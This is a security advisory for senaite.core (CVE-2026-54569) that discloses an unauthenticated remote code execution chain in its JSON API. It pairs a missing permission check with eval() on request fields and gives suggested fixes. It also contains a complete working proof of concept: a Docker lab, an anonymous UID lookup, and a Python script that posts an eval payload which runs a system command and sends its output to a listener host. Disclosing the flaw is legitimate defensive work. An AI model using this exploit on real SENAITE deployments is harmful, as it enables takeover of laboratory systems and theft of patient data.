# [C] senaite.core Vulnerable to Eval Injection and Missing Authorization

## Summary
Severity: Critical
Advisory: GHSA-jrw6-7x4q-w25j
CVE: CVE-2026-54569
CWE: CWE-862, CWE-95
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-26
Source: https://github.com/advisories/GHSA-jrw6-7x4q-w25j
Type: github-advisory

## Affected
- PyPI: `senaite.core` — affected >=2.0.0

## Details
### Summary

An unauthenticated remote code execution vulnerability in the SENAITE JSON API allows any network-reachable attacker to execute arbitrary Python on the Zope worker process via a two-request anonymous chain. The `/@@API/update` route is reachable to anonymous callers and runs `eval()` on attacker-controlled input before any permission check fires.

This is a different code path from the `eval()` in the calculations module: no authenticated account of any kind is required.

### Details

The vulnerability is the chain of two independent flaws. Either fix alone breaks the unauthenticated chain, but the `eval` sink remains exploitable by any authenticated user with write access to a `RecordsField`, so both fixes are needed.

**1. Missing `AccessJSONAPI` gate on JSON API write routes (CWE-862).** The route at [`src/bika/lims/jsonapi/update.py:45-165`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/bika/lims/jsonapi/update.py#L45-L165) does not enforce the `senaite.core: Access JSON API` permission upfront. Compare with the sibling [`create.py:179-182`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/bika/lims/jsonapi/create.py#L179-L182), which does:

```python
if not getSecurityManager().checkPermission(AccessJSONAPI, parent):
    raise Unauthorized(...)
```

The check is present on `create` and absent on `update`, `update_many`, `remove`, `doActionFor`, `doActionFor_many`, and `getusers`. The underlying `@@API` view is registered by `plone.jsonapi.core` at [`browser/configure.zcml:8-13`](https://github.com/collective/plone.jsonapi.core/blob/0.6/src/plone/jsonapi/core/browser/configure.zcml#L8-L13) with `permission="zope2.View"`, which is granted to Anonymous on the Plone Site root.

When an `obj_uid` is supplied, the route resolves the target through `uid_catalog` and `brain.getObject()`. The catalog brain walks the parent path with `unrestrictedTraverse` and applies `restrictedTraverse` only on the final segment, so the per-object View permission is enforced on the target. The chain is reachable to anonymous because `bika_setup` is anonymous-readable on a stock Plone Site (the `View` permission is acquired from the Plone Site root, which grants `View` to `Anonymous` by default).

**2. `eval()` on `RecordsField` / `RecordField` values inside `set_fields_from_request` (CWE-95).** Once an object has been resolved, [`set_fields_from_request` in `jsonapi/__init__.py:199-252`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/bika/lims/jsonapi/__init__.py#L199-L252) iterates the request fields. For any field of type `RecordsField` or `RecordField`, the helper runs `eval(value)` on the raw request string at [line 240](https://github.com/senaite/senaite.core/blob/v2.6.0/src/bika/lims/jsonapi/__init__.py#L240), **before** the field mutator and its `write_permission` check execute:

```python
elif fieldtype in ['senaite.core.browser.fields.records.RecordsField',
                   'senaite.core.browser.fields.record.RecordField']:
    try:
        value = eval(value)
    except Exception:
        logger.warning(
            "JSONAPI: " + fieldname + ": Invalid "
            "JSON/Python variable")
        return []
```

The `eval` runs in the Zope worker process with full Python builtins available, so a payload such as `__import__('os').popen('id').read()` executes arbitrary system commands. The transaction savepoint inside `update.py` rolls back ZODB writes when the mutator subsequently fails, but Python side effects (subprocess, urllib calls, file I/O outside ZODB) have already happened and are not reverted.

The same `eval()` pattern is also present in the field setters at [`record.py:253-262`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/senaite/core/browser/fields/record.py#L253-L262) and [`records.py:135-143`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/senaite/core/browser/fields/records.py#L135-L143).

**Anonymous UID discovery.** The `bika_setup` object exposes two `RecordsField`-typed fields: `RejectionReasons` and `IDFormatting`. Its UID is published anonymously by Plone's standard [`@@uuid`](https://github.com/plone/plone.app.uuid) view:

```
GET /senaite/bika_setup/@@uuid HTTP/1.1
HTTP/1.1 200 OK
Content-Type: text/plain

8dbc161fa9f74aa4ad6e76eb1934518a
```

**Origin.** Both flaws predate the SENAITE fork. The `eval()` sink was introduced in [`d7bf2d4507`](https://github.com/senaite/senaite.core/commit/d7bf2d4507) (2013-09-04) and the unchecked `update` route in [`be3d8cc916`](https://github.com/senaite/senaite.core/commit/be3d8cc916) (2013). Both remain present on the current 2.x development tip.

### Suggested fixes

**Fix 1: add `AccessJSONAPI` check to every state-changing route** in `src/bika/lims/jsonapi/`, mirroring the existing check in `create.py`. An audit of every `IRouteProvider` in [`configure.zcml`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/bika/lims/jsonapi/configure.zcml) is in scope.

```python
# src/bika/lims/jsonapi/update.py
from AccessControl import getSecurityManager
from zExceptions import Unauthorized
from senaite.core.permissions import AccessJSONAPI

def update(self, context, request):
    if not getSecurityManager().checkPermission(AccessJSONAPI, context):
        raise Unauthorized("You don't have permission to update via JSONAPI")
    savepoint = transaction.savepoint()
    ...
```

**Fix 2: replace `eval()` with `json.loads()`.** The data shape stored in `RecordField` and `RecordsField` is a JSON-compatible dict / list of dicts. Parsing as JSON is sufficient and removes the code-execution primitive entirely:

```python
# src/bika/lims/jsonapi/__init__.py
import json

elif fieldtype in ['senaite.core.browser.fields.records.RecordsField',
                   'senaite.core.browser.fields.record.RecordField']:
    try:
        value = json.loads(value)
    except (ValueError, TypeError):
        logger.warning("JSONAPI: %s: invalid JSON value", fieldname)
        return []
```

Apply the same change at [`record.py:253-262`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/senaite/core/browser/fields/record.py#L253-L262) and [`records.py:135-143`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/senaite/core/browser/fields/records.py#L135-L143).

**Defense in depth: re-enable Plone's CSRF protection.** The audited release ships with `class ISenaiteCore(IDisableCSRFProtection)` at [`src/senaite/core/interfaces/__init__.py:30`](https://github.com/senaite/senaite.core/blob/v2.6.0/src/senaite/core/interfaces/__init__.py#L30), which disables `plone.protect`'s automatic CSRF write-detection on every request handled by the SENAITE browser layer. Removing the inheritance does not affect this unauthenticated chain but closes several authenticated CSRF chains.

### PoC

Tested against the unmodified upstream Docker image `senaite/senaite:v2.6.0`. No source-code modification, no buildout overrides, no reverse proxy. `PASSWORD` is set to a non-default value to demonstrate that the chain works without the `admin:admin` Docker fallback.

**`docker-compose.yml`**

```yaml
services:
  senaite:
    image: senaite/senaite:v2.6.0
    ports:
      - "8080:8080"
    environment:
      PASSWORD: senaitestrong  # non-default; chain is credential-free
      SITE: senaite
    networks:
      - poc

  listener:
    image: python:3.11-alpine
    command:
      - python
      - -c
      - |
        import http.server, socketserver
        log = []
        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith('/log'):
                    self.send_response(200); self.send_header('Content-Type', 'text/plain'); self.end_headers()
                    self.wfile.write(('\n'.join(log)).encode())
                else:
                    log.append(self.path)
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
            def log_message(self, *a, **k): pass
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.TCPServer(('', 8000), H) as s: s.serve_forever()
    ports:
      - "8000:8000"
    networks:
      - poc

networks:
  poc:
```

**`poc.py`**

```python
#!/usr/bin/env python3
"""PoC: Unauthenticated RCE on SENAITE.CORE v2.6.0"""
import sys, time, urllib.error, urllib.parse, urllib.request

TARGET = "http://localhost:8080"
SITE = "senaite"
LISTENER_HOST = "http://localhost:8000"
LISTENER_INSIDE = "http://listener:8000"

PAYLOAD = (
    "__import__('urllib2').urlopen("
    f"'{LISTENER_INSIDE}/?id=' + "
    "__import__('os').popen('id').read().replace(' ', '_').replace('\\n', '_')"
    ")"
)

def http_get(url, timeout=5):
    req = urllib.request.Request(url, headers={"Accept": "*/*"})
    return urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", "ignore")

def http_post(url, fields, timeout=10):
    body = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    return urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", "ignore")

def wait_for_target():
    deadline = time.time() + 600
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(f"{TARGET}/{SITE}/login_form", timeout=3) as r:
                if r.status == 200: return
        except Exception: pass
        time.sleep(3)
    sys.exit(1)

def discover_bika_setup_uid():
    body = http_get(f"{TARGET}/{SITE}/bika_setup/@@uuid", timeout=5).strip()
    if len(body) == 32 and all(c in "0123456789abcdef" for c in body):
        return body
    sys.exit(1)

def fire_payload(uid):
    try:
        http_post(f"{TARGET}/{SITE}/@@API/update",
                  {"obj_uid": uid, "RejectionReasons": PAYLOAD})
    except urllib.error.HTTPError:
        pass

def read_listener():
    time.sleep(1)
    try:
        log = http_get(f"{LISTENER_HOST}/log", timeout=3)
    except Exception:
        return False
    return "id=" in log

if __name__ == "__main__":
    wait_for_target()
    uid = discover_bika_setup_uid()
    fire_payload(uid)
    sys.exit(0 if read_listener() else 1)
```

**Run**

```
docker compose up -d
# wait ~1-3 minutes for the senaite-docker first-boot Plone Site provisioning
python3 poc.py
```

**Expected output**

```
[+] VULNERABLE: unauthenticated RCE on SENAITE.CORE v2.6.0
    captured: /?id=uid=500(senaite)_gid=500(senaite)_groups=500(senaite)_
```

The captured query string is the stdout of `id` from the SENAITE Zope worker, fetched by the worker's `urllib2.urlopen` call against the in-network listener, proving arbitrary Python execution from a request carrying no credentials.

### Impact

**Vulnerability type:** Unauthenticated remote code execution. Chain of CWE-862 (Missing Authorization) and CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code / Eval Injection).

**Who is impacted:** Every SENAITE deployment whose Plone Site root grants `View` to Anonymous (the upstream default) and whose `/@@API/...` endpoints are reachable from any attacker-controlled network. The upstream Docker compose ships `8080:8080` plain HTTP and `/manage` (ZMI) exposed.

**Attacker capability after exploit:**
- Arbitrary Python execution in the Zope worker process.
- Full read/write access to the ZODB (`Data.fs` and `blobstorage`), so any patient/lab data the LIMS holds.
- Filesystem access on the container's `/data` volume.
- Outbound network egress from the worker.
- Direct access to `acl_users` (the Plone PAS user folder) for creating administrator accounts in ZODB. Combined with the exposed `/manage` ZMI, this gives durable post-exploitation access.

**Affected versions:** All SENAITE.CORE 2.x releases (2.0.0 through 2.6.0).

### Credits

Discovered and reported by Machine Spirits UG, Cologne, Germany. Independent security research focused on medical device and healthcare application security.

- Dr. Simon Weber
- Dipl.-Inf. Volker Schönefeld
- Chiara Fliegner

Website: https://machinespirits.com

## References
- https://github.com/senaite/senaite.core/security/advisories/GHSA-jrw6-7x4q-w25j
- https://github.com/senaite/senaite.core/pull/2903
- https://github.com/senaite/senaite.core/pull/2919
- https://github.com/senaite/senaite.core/commit/a24d65e99a17ac43c5374ed9f0a60d0fe60d2f74
- https://github.com/senaite/senaite.core/commit/ef4b6d73575b0fbc0edc6114e5e025089aaf9eb7
- https://github.com/senaite/senaite.core
